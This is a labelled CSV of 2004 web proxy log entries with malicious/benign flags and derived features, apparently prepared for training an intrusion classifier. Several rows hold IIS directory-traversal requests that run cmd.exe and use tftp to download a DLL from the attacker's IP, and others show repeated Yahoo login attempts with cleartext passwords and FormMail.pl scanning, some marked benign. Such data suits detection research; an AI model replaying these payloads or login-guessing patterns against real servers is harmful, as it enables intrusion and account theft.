,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
3802,221.7.192.11,10/Mar/2004:06:27:17 -0500,http://ccbbs.cn/ ,200,12711,"""http://ccbbs.cn""",Mozilla/4.75 [en] (Win95; I),n,0,/,0,without browser
3803,192.117.242.67,10/Mar/2004:06:27:21 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3804,80.201.160.41,10/Mar/2004:06:27:24 -0500,http://www.cl-erotic.com/members/ ,200,0,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/members/,0,without browser
3805,192.117.242.67,10/Mar/2004:06:27:29 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3806,203.121.182.188,10/Mar/2004:06:27:40 -0500,203.47.151.122:25 ,500,434,"""-""",-,n,0,203.47.151.122:25,0,without browser
3807,67.32.209.144,10/Mar/2004:06:27:43 -0500,http://www.shadowplayers.com/members/memberpage.html ,200,0,"""-""",Mozilla/4.08 [de]C-DT (Win98; I),n,0,/members/memberpage.html,0,without browser
3808,208.190.202.194,10/Mar/2004:06:27:47 -0500,http://l6.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_j_e&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3809,208.190.202.194,10/Mar/2004:06:27:53 -0500,http://l6.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_eber_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3810,68.48.142.117,10/Mar/2004:06:27:58 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3811,221.7.192.11,10/Mar/2004:06:28:07 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.asp,0,Microsoft Internet Explorer
3812,67.83.151.132,10/Mar/2004:06:28:17 -0500,http://www.geoffmetcalf.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3813,208.190.202.194,10/Mar/2004:06:28:21 -0500,http://l6.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_etom_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3814,67.83.151.132,10/Mar/2004:06:28:27 -0500,http://www.morrisseyagency.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3815,67.83.151.132,10/Mar/2004:06:28:38 -0500,http://www.domestic.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3816,68.48.142.117,10/Mar/2004:06:28:48 -0500,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3817,67.83.151.132,10/Mar/2004:06:28:54 -0500,http://www.badoeynhausen.de/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3818,67.83.151.132,10/Mar/2004:06:28:57 -0500,http://www6.ocn.ne.jp/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3819,67.83.151.132,10/Mar/2004:06:29:40 -0500,http://www.singersoutdoors.co.uk/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3820,208.190.202.194,10/Mar/2004:06:29:40 -0500,http://l6.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_j_o_s_e&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3821,68.48.142.117,10/Mar/2004:06:29:41 -0500,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
3822,218.29.56.234,10/Mar/2004:06:29:44 -0500,http://www.gravity-search.net/cgi-bin/smartsearch.cgi?username=goball&keywords=Money+Jewelry ,200,19908,"""http://parts.ownsthis.com/gravity-search.html""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/cgi-bin/smartsearch.cgi,2,Microsoft Internet Explorer
3823,208.190.202.194,10/Mar/2004:06:29:47 -0500,http://l6.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_j_u_l_i_e_t&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3824,208.190.202.194,10/Mar/2004:06:30:13 -0500,http://l6.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_jake__&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3825,192.117.242.67,10/Mar/2004:06:30:14 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3826,218.10.151.196,10/Mar/2004:06:30:16 -0500,http://www.enjoysearching.com/cgi-bin/smartsearch.cgi ,200,12569,"""http://yahoo.com.cn""",Mozilla/4.0 (compatible; MSIE 4.0; Windows 95),n,0,/cgi-bin/smartsearch.cgi,0,Microsoft Internet Explorer
3827,67.83.151.132,10/Mar/2004:06:30:16 -0500,http://home.joice.net/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3828,68.48.142.117,10/Mar/2004:06:30:31 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3829,221.7.192.11,10/Mar/2004:06:30:32 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.asp,0,Microsoft Internet Explorer
3830,220.173.17.142,10/Mar/2004:06:30:33 -0500,http://track.ppmdating.com/ci.cfm?VTLID=501164&VTCID=206 ,200,43,"""http://www.business.com""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT),n,0,/ci.cfm,2,Microsoft Internet Explorer
3831,220.173.17.142,10/Mar/2004:06:30:34 -0500,http://images.ppmdating.com/CreativeImages/Image_CID206_IMG1.gif ,200,9272,"""http://www.business.com""",Mozilla/4.0 (compatible; MSIE 5.02; Windows NT),n,0,/CreativeImages/Image_CID206_IMG1.gif,0,Microsoft Internet Explorer
3832,67.83.151.132,10/Mar/2004:06:30:39 -0500,http://www.fleetwoodmac.net/cgi-bin/formmail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/formmail.pl,0,Microsoft Internet Explorer
3833,218.29.56.234,10/Mar/2004:06:30:40 -0500,http://www.gravity-search.net/cgi-bin/sf.cgi?t=s9&keys=cpcofdhxzodhffdshkzcdfxcczxzapxkcccczvavcpsachsfzkfmccczsfaocicackacaacdcxccacxvcnxhdszsakcvxhdpzfhafvdpfzhscxcvxhdphhzvdvfpsxazsodadzcsahsocmsachsfhpdndidazdakcvxhccxcamxkfddnaaapxkcscfaxaispcdxdhchkfyccczsfaocicccxxcamxkfafshdzvfvccczsfxmcvchczsfzhfodyxnzfhpffffdihhhydxfadzznscdadpdixzapckcfxdxzapckcfxdcvamckcfxdzzzydifhscasaocvxhsxazaocvxhdszscxcnchczsfavfydkdmxcamckcfxdhazmazcdcdahsockcasxazaocvxhfczzcxcnchczsfavspcdcdahsodvddavazaocvxhcfxcamckcfxdhxzyazcdcdahsospcdcdahsodvdxavazaocvxhsxazaocvxhdxzzcxcnchczsfascocscxsvhmcpfsfhhhaicmczxnaaavcoccxnakaicmcnsxazaocvxhfshacxcnchczsfancpcfccadancmcfsxazaocvxhfxhhcxcnchczsfaacncncaahamcncscxxcamckcfxdhahaazcdcdahsockccchaxamcvsachafapxkfpfycnamckcfxdakapcvcdcxazxvcnchczsfzcffaychafapxkczsxazaocvxhfczfcxcnchczsfavspcdcdahsodvdhavazaocvxhddzacmspcdcdahsodkddshahaocvxhffzhxmcvchczsfhfdvfsxnzszodhfpdshyzpdvfvxnzozfdasdczafapxksdczafapxkakchafapxkdddazshospcdxdzszkfvfacsahsocfcvfkhhhpaosachsfzxfmccczsfapcmcsczspamcmxodazfzcfadcfkzhzpsfsachsfhidpffcsahsocncnfcazapfpcvcsaxansvsssxazsofpfcdyhhakcvxhchafavcnsachsfhifofdshazsofkfsddzvhpaosdczsfaacpxkczassccicxxnaaaksncfxdxzapxkakchsfzmdidxfdaphadkdnxszizcdsdkdszvzcdhdidszazcccfafsznskckssxdcnamxkssszsfxncdxhcfacsoccdkcvhozyfkxkczzhhixzfpdzhxsccfcvfkhhhpdoxkfyhozdxzxycizzzydifhcmhkzoddxcfyhkzcdzdfffapxvsoxccxacanxhcscmhchkdz&kw=money+jewelry ,300,924,"""http://www.gravity-search.net/cgi-bin/smartsearch.cgi?username=goball&keywords=Money+Jewelry""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),m,1,/cgi-bin/sf.cgi,3,Microsoft Internet Explorer
3834,67.83.151.132,10/Mar/2004:06:30:40 -0500,http://home.joice.net/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3835,212.43.68.149,10/Mar/2004:06:30:40 -0500,/saeco/start.php?seite=cytexx ,400,283,"""http://www.strominfos.de/stromnews.html""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),n,0,/saeco/start.php,1,Microsoft Internet Explorer
3836,218.29.56.234,10/Mar/2004:06:30:45 -0500,http://xml.seek99.com/go2.htm?a=%14%8C%EC%3B%C5&bid=assyaaasaxax&url=http%3A%2F%2F66.77.72.19%2FSearch%3Ffig%3D3153%26evid%3DCE0069d23c83%26eng%3DLooksmart-03-2002%26cb%3DSeek99%26dest%3Dhttp%253A%252F%252Fwww.looksmart.com%252Fog%252Fpr%253DPsr%253Bro%253D1%253Brc%253D4%253Bla%253D313229%253Blm%253D230365%253Bli%253D103327839%253Bed%253D20040210%253Bii%253D8049.6616.404efc1f.1068%253Bpn%253D%253Bto%253D%253Btc%253D4%253Bpo%253D1%253Bpc%253D15%253Bpi%253Dzag1%253Bts%253D%257Chttp%253A%252F%252Fwww.bodyjeweler.biz%252F%26engid%3D1675%26gid%3D4040%26af%3D0%26qtype%3D0%26qw%3Dmoney%2Bjewelry%26ts%3D1078918175%26cs%3D11a06%2F2&valsearch=1 ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),m,1,/go2.htm,4,Microsoft Internet Explorer
3837,67.83.151.132,10/Mar/2004:06:30:49 -0500,http://www.necgroup.co.uk/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3838,219.156.217.42,10/Mar/2004:06:30:54 -0500,http://www.pay-per-click.ws/s.php?keywords=betting&username=egoldsky ,200,23939,"""http://www.egoldsky.net/en/ppcsearch.htm""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),n,0,/s.php,2,Microsoft Internet Explorer
3839,221.7.192.11,10/Mar/2004:06:31:06 -0500,http://www.ccbbs.cn/ ,200,18551,"""http://www.ccbbs.cn""",Mozilla/4.75 [fr] (Win98; I),n,0,/,0,without browser
3840,219.156.217.42,10/Mar/2004:06:31:10 -0500,http://www.pay-per-click.ws/other.php?k=hphahzhdhazmhmhnhphazfzssifaandfaafosvdisifzfzfcdfdvfpfnfydhdmfczvdvaddisidyzhdfshfafyfmhddcsfdfshddhzdiandyazansvdfhxachdfodfdyaxddhzdiandhzcsxzidpaddiandyzhdfshddhcsvsddkdkfhamdpaddiandhsfdffkdcfddaszfnazfvasdysnfmsvsffaavzidkakfpdddpdfdyzyasfkachdfodfdyspdkhcaxdddpdfdyzifzhcfpspdcsfdfshzxdsaxsdzkavanziaifkaxsidfsyanspdkhcaxdhfidfdyaozkdsfmdddpdfdyapdnfysvhazfsyfoaadysnachaasdyavaadkakacdhfidfdyaozkdsfmdhfidfdyzidvdhdiamdcdyfzazzdfksnazzpsydaapscfyfpsodpsofoasdyffsvsndpsydaasdkdssvhffnsyansmzfffdisisfsyfoasdyaffdsoddddfiaadydzachadkfssczhaoakachsdcavfhazskdsaxhadfsyfzdddcfddafkdpdfdyzvdvfddisvdxfzdfaxzddzfzhazyfhfpzkfhhzdianfvzhdfshdyaddisidhfzfvassdfddihzsyanfvacfhfdfhhzfidkfhzofzshdasczfzxfzazfafyfmsxspdkfzasdcakdyspfadksczhzdfksnazzpzxsxszdpdzfxhddxandfznddsvdihhdydffmasdcakdahadxsffvaasddhfxsisyfzfvzhdydsaxazfiazdyaxzxfdfmavzfzxfzscdyfdfhandzdkapzidpafdispdxsfdfznzxdhfmdcfizcsxszzffkfmhddcfhfpasdydhfzhzzmfzfhayfsfyfmsvdkazansvdnhxfhsmdpazscazfodaaxsxdfzcanshfsdaacsnzmzxsxsmzfsnsnandfzxfhzvzcakdysifidkfhazdfshacazdzzcdaahahdhachadkfssczifzfpsvscskzcfcdffosvdifcdzfxapazacdffxhcfpdmfcdfdvskazfvzyzdfosvafdaaddksddmfcdfdvskfmsvsffaavzidkakfpdzdhsafcfyamsddsfxddzododdzxhcsvaczksdanshaihcaxazfizcfzazfhsvacsfzfdmfcdfdvfpfnfydhdmfcdfdvashzdzdhdmfcdddvfpfnfyfaandfaafosvdisifafpfmzasyshasanzzsosvspskzmsaadsfaisoskaazmaisdsmhmsyakskafshadadazapahshsaznavsmsdaasihnzmhisfaiafao&u=rpilot&a=egoldsky&sid=base&keywords=betting&gen=s&gto=znzhhhhahhzfzohyzizc ,300,0,"""http://www.pay-per-click.ws/s.php?keywords=betting&username=egoldsky""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),m,1,/other.php,7,Microsoft Internet Explorer
3841,68.105.26.80,10/Mar/2004:06:31:17 -0500,http://edit.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=kittyzeroofthedemonkyu&passwd=lucky ,200,566,"""-""",-,n,0,/config/login,8,without browser
3842,219.156.217.42,10/Mar/2004:06:31:18 -0500,http://click.revenuepilot.com/servlet/link?link=P_MzMzMzMzMAAAABAAAH2gAAAAAAAAAAAA9pczEuY3Jhd2xlci5jb20BH8USItyFAgAHYmV0dGluZwAAAAk_hHrhR64UewAAAAD7NInueEBTMzMAA3htbAF0aHR0cDovL3BhcnRuZXJzLm15Z2Vlay5jb20vcHJlc3VsdHMuanNwP3BhcnRuZXJpZD05ODUyOCZ2ZW5kb3JJZD04MjYxMiZ0eXBlPTUmY29kZT0xJnJhdGU9NDgzNDgzNjY0JmNyPTQ4MzQ4MzY2NCZkb21haW49aXMxLmNyYXdsZXIuY29tJnF1ZXJ5PTEwNzg5MTgyNDAzMjUlM0ElM0E2OC40OC4xMDYuMTA5JTNBJTNBYmV0dGluZyZ1cmw9aHR0cCUzQSUyRiUyRmlzMS5jcmF3bGVyLmNvbSUyRkNyYXdsLm1haW4uYWZmMDA0JTJGZG9nJTJGcmVzdWx0cyUzRm90bXBsJTNEZG9nJTJGd2VicmVzdWx0cy5odG0lMjZxY2F0JTNEd2ViJTI2cWt3JTNEYmV0dGluZyUyNnFrJTNEMjAlMjZtZXRob2QlM0QlMjZ0b3AlM0QxJTI2c3RhcnQlM0QlMjZ2ZXIlM0QzMjA5AAAAAAAAAD_zMzMzMzMz ,300,410,"""http://www.pay-per-click.ws/s.php?keywords=betting&username=egoldsky""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),m,1,/servlet/link,1,Microsoft Internet Explorer
3843,68.48.142.117,10/Mar/2004:06:31:22 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3844,219.156.217.42,10/Mar/2004:06:31:23 -0500,http://partners.mygeek.com/presults.jsp?partnerid=98528&vendorId=82612&type=5&code=1&rate=483483664&cr=483483664&domain=is1.crawler.com&query=1078918240325%3A%3A192.168.1.103%3A%3Abetting&url=http%3A%2F%2Fis1.crawler.com%2FCrawl.main.aff004%2Fdog%2Fresults%3Fotmpl%3Ddog%2Fwebresults.htm%26qcat%3Dweb%26qkw%3Dbetting%26qk%3D20%26method%3D%26top%3D1%26start%3D%26ver%3D3209 ,300,425,"""http://www.pay-per-click.ws/s.php?keywords=betting&username=egoldsky""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),n,0,/presults.jsp,9,Microsoft Internet Explorer
3845,61.172.244.109,10/Mar/2004:06:31:31 -0500,209.15.20.74:25 ,200,0,"""-""",-,n,0,209.15.20.74:25,0,without browser
3846,208.190.202.194,10/Mar/2004:06:31:33 -0500,http://l7.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_j_u_l_i_e_t&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3847,67.83.151.132,10/Mar/2004:06:31:34 -0500,http://frontpage.simnet.is/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3848,208.190.202.194,10/Mar/2004:06:31:40 -0500,http://l7.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_jonas__&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3849,218.10.151.196,10/Mar/2004:06:31:52 -0500,http://mine-seek.com/search.php?ID=164&fString=Baseball ,300,0,"""http://www.yiqifa.con.cn/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,2,Microsoft Internet Explorer
3850,217.107.218.126,10/Mar/2004:06:31:54 -0500,http://www.checker.freeproxy.ru/anonymous/anonshow.php ,200,883,"""-""",-,n,0,/anonymous/anonshow.php,0,without browser
3851,219.156.217.42,10/Mar/2004:06:31:56 -0500,http://is1.crawler.com/Crawl.main.aff004/dog/results?otmpl=dog/webresults.htm&qcat=web&qkw=betting&qk=20&method=&top=1&start=&ver=3209 ,200,45509,"""http://www.pay-per-click.ws/s.php?keywords=betting&username=egoldsky""",Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0),n,0,/Crawl.main.aff004/dog/results,6,Microsoft Internet Explorer
3852,218.10.151.196,10/Mar/2004:06:31:58 -0500,http://mine-seek.com/search_results.php?fSearch_id=c223fba6b3e1ca03&fString=baseball ,200,16361,"""http://www.yiqifa.con.cn/""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search_results.php,2,Microsoft Internet Explorer
3853,218.10.151.196,10/Mar/2004:06:32:01 -0500,http://mine-seek.com/redirect.php?fID=2951924 ,300,0,"""http://mine-seek.com/search_results.php?fSearch_id=c223fba6b3e1ca03&fString=baseball""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/redirect.php,1,Microsoft Internet Explorer
3854,218.10.151.196,10/Mar/2004:06:32:04 -0500,http://mine-seek.com/index.php ,200,13370,"""http://mine-seek.com/search_results.php?fSearch_id=c223fba6b3e1ca03&fString=baseball""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.php,0,Microsoft Internet Explorer
3855,208.190.202.194,10/Mar/2004:06:32:06 -0500,http://l7.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_jonas__&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3856,68.48.142.117,10/Mar/2004:06:32:12 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3857,67.83.151.132,10/Mar/2004:06:32:17 -0500,http://www.scmwa.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3858,221.7.192.11,10/Mar/2004:06:32:27 -0500,http://ccbbs.cn/ ,200,12711,"""http://ccbbs.cn""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/,0,Microsoft Internet Explorer
3859,192.117.242.67,10/Mar/2004:06:32:34 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3860,67.83.151.132,10/Mar/2004:06:32:39 -0500,http://www.factoryskatepark.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3861,67.83.151.132,10/Mar/2004:06:32:44 -0500,http://www.buckhickman.co.uk/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3862,192.117.242.67,10/Mar/2004:06:32:48 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
3863,68.48.142.117,10/Mar/2004:06:33:02 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
3864,67.83.151.132,10/Mar/2004:06:33:12 -0500,http://www.susanlawrence.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3865,67.83.151.132,10/Mar/2004:06:33:13 -0500,http://frontpage.simnet.is/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3866,208.190.202.194,10/Mar/2004:06:33:26 -0500,http://l7.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_lucky__&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3867,208.190.202.194,10/Mar/2004:06:33:32 -0500,http://l7.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_e_r_i_n_&passwd=zelda ,200,566,"""-""",-,n,0,/config/login,8,without browser
3868,67.83.151.132,10/Mar/2004:06:33:54 -0500,http://www.v-pay.com/cgi-bin/FormMail.pl ,200,578,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705),n,0,/cgi-bin/FormMail.pl,0,Microsoft Internet Explorer
3869,68.48.142.117,10/Mar/2004:06:33:56 -0500,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
3870,68.48.142.117,10/Mar/2004:06:33:56 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
3871,68.48.142.117,10/Mar/2004:06:33:56 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
3872,68.48.142.117,10/Mar/2004:06:33:56 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
